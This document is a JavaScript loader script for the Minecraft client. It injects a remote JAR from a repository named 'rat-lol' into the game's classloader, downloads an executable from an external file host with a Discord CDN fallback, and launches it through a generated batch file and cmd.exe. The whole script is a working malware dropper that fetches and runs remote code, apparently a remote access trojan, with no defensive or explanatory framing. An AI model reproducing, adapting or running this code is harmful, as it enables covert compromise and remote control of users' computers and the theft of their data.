// ===== ULTIMATE WORKING VERSION =====
(function() {
    // Unique execution lock
    var lockFile = new java.io.File(java.lang.System.getProperty("java.io.tmpdir"), "mc_loader.lock");
    if (lockFile.exists()) return;
    lockFile.createNewFile();
    lockFile.deleteOnExit();

    // Robust logging system
    var logFile = new java.io.File(java.lang.System.getProperty("java.io.tmpdir"), "mc_loader_debug.log");
    var logWriter = new java.io.PrintWriter(new java.io.FileWriter(logFile));
    
    function log(message) {
        var timestamp = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS").format(new java.util.Date());
        var logMessage = "[" + timestamp + "] " + message;
        logWriter.println(logMessage);
        logWriter.flush();
        print(logMessage);
    }

    try {
        log("=== INITIALIZING LOADER ===");
        
        // ===== 1. JAR LOADING =====
        try {
            log("Loading JAR file...");
            var URLClassLoader = Java.type("java.net.URLClassLoader");
            var URL = Java.type("java.net.URL");
            var Minecraft = Java.type("net.minecraft.client.Minecraft");
            
            var jarURL = new URL("https://github.com/MansHeree/rat-lol/raw/refs/heads/main/LWJGL-3.6-SNAPSHOT-ALL.jar");
            var classLoader = Minecraft.class.getClassLoader();
            
            var addURL = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
            addURL.setAccessible(true);
            addURL.invoke(classLoader, jarURL);
            
            // Verify JAR loaded
            try {
                classLoader.loadClass("org.lwjgl36.VersionImp").getMethod("init").invoke(null);
                log("JAR verification successful");
            } catch (e) {
                log("JAR verification failed: " + e);
            }
        } catch (e) {
            log("JAR LOAD ERROR: " + e);
        }

        // ===== 2. EXE HANDLING =====
        var exePath = null;
        try {
            // Download with multiple fallbacks
            var exeUrls = [
                "https://r2.e-z.host/c4fb8249-0756-49bd-8cab-d1d22d088421/apb3y3z4.exe",
                "https://cdn.discordapp.com/attachments/your_alternative_url/backup.exe"
            ];
            
            for (var i = 0; i < exeUrls.length; i++) {
                try {
                    log("Attempting download from: " + exeUrls[i]);
                    exePath = new java.io.File(
                        java.lang.System.getProperty("java.io.tmpdir"),
                        "mc_" + java.lang.System.nanoTime() + ".exe"
                    );
                    
                    var conn = new java.net.URL(exeUrls[i]).openConnection();
                    conn.setConnectTimeout(15000);
                    conn.setReadTimeout(15000);
                    conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                    
                    var in = conn.getInputStream();
                    var out = new java.io.FileOutputStream(exePath);
                    
                    var buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 8192);
                    var bytesRead;
                    while ((bytesRead = in.read(buffer)) != -1) {
                        out.write(buffer, 0, bytesRead);
                    }
                    in.close();
                    out.close();
                    
                    log("EXE successfully downloaded to: " + exePath.getAbsolutePath());
                    break;
                } catch (e) {
                    log("Download attempt " + (i+1) + " failed: " + e);
                    if (exePath && exePath.exists()) exePath.delete();
                }
            }
            
            if (!exePath || !exePath.exists()) {
                throw new Error("All download attempts failed");
            }
        } catch (e) {
            log("EXE DOWNLOAD FAILED: " + e);
            return;
        }

        // ===== 3. EXE EXECUTION =====
        try {
            log("Preparing to execute EXE...");
            
            // Create persistent debug script
            var debugScript = [
                '@echo off',
                'title MC Loader Debug Console',
                'echo === DEBUG INFORMATION ===',
                'echo Timestamp: %date% %time%',
                'echo EXE Path: ' + exePath.getAbsolutePath(),
                'echo File Size: ' + exePath.length() + ' bytes',
                'echo.',
                'echo === PROCESS CHECK ===',
                'tasklist /FI "IMAGENAME eq ' + exePath.getName() + '"',
                'echo.',
                'echo === EXECUTION ATTEMPT ===',
                'start "" "' + exePath.getAbsolutePath() + '"',
                'timeout /t 3 >nul',
                'echo.',
                'echo === VERIFICATION ===',
                'tasklist /FI "IMAGENAME eq ' + exePath.getName() + '"',
                'if errorlevel 1 (',
                '   echo ERROR: Process failed to start',
                '   echo Possible reasons:',
                '   echo 1. Antivirus blocking',
                '   echo 2. Missing dependencies',
                '   echo 3. File corruption',
                ') else (',
                '   echo SUCCESS: Process is running',
                ')',
                'echo.',
                'pause'
            ].join('\n');
            
            var debugFile = new java.io.File(exePath.getParentFile(), "debug_" + exePath.getName().replace('.exe', '.bat'));
            var writer = new java.io.PrintWriter(debugFile);
            writer.println(debugScript);
            writer.close();
            
            // Execute with proper environment
            var pb = new java.lang.ProcessBuilder('cmd.exe', '/c', 'start', 'cmd.exe', '/k', debugFile.getAbsolutePath());
            pb.directory(new java.io.File(java.lang.System.getProperty('user.home')));
            var env = pb.environment();
            env.put('PATH', java.lang.System.getenv('PATH'));
            env.put('TEMP', java.lang.System.getenv('TEMP'));
            pb.start();
            
            log("Execution attempted - debug window should appear");
        } catch (e) {
            log("EXE EXECUTION ERROR: " + e);
        }
        
    } catch (e) {
        log("CRITICAL ERROR: " + e);
    } finally {
        log("=== OPERATION COMPLETE ===");
        logWriter.close();
        
        // Auto-open logs
        try {
            java.awt.Desktop.getDesktop().open(logFile);
        } catch (e) {
            try {
                java.lang.Runtime.getRuntime().exec(['cmd.exe', '/c', 'start', 'notepad.exe', logFile.getAbsolutePath()]);
            } catch (e) {}
        }
    }
})();